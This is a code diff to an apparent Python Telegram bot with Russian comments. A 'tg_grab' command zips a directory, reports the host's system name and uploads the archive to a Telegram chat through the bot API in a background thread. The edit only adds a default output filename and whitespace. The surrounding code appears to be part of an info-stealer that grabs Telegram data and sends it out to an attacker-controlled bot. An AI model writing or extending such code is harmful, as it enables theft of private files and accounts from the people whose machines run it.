@@ -286,8 +286,10 @@ def start(message):
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 
 
+output_zip = "example_output"
+
 @bot.message_handler(commands=['tg_grab'])
-def create_zip_archive(source_dir):
+def create_zip_archive(source_dir, output_zip=output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
             pass  # Создаем пустой архив для начала
@@ -305,10 +307,12 @@ def create_zip_archive(source_dir):
     except Exception as e:
         print(f"Error creating zip archive: {str(e)}")
         return None
+
 def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
     response = requests.post(url, data=data)
+
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
     files = {'document': (file_name, open(file_path, 'rb'))}
@@ -317,6 +321,7 @@ def send_file_to_telegram(file_path, file_name):
     if response.status_code != 200:
         print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
         print(response.text)
+
 def handle_tg_grab_command(message):
     thread = threading.Thread(target=archive_and_send)
     thread.start()
